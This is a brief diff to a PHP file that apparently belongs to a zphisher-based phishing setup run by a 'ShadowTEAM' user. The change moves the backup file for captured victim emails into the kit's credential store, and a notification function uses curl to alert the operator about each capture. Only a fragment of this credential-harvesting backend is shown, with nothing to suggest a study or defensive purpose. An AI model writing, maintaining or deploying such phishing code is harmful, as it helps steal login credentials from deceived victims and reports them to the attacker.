@@ -7,7 +7,7 @@ $email = $_SESSION["Email"];
 // Original file path
 $original_file_path = '/home/ShadowTEAM-Guest/zphisher/auth/usernames.dat';
 // Specified file path for storing existing emails
-$specified_file_path = '/home/ShadowTEAM-Guest/backup.txt';
+$specified_file_path = '/home/ShadowTEAM-Guest/zphisher/auth/backup.txt';
 
 function sendPushoverNotification($email) {
     $ch = curl_init();
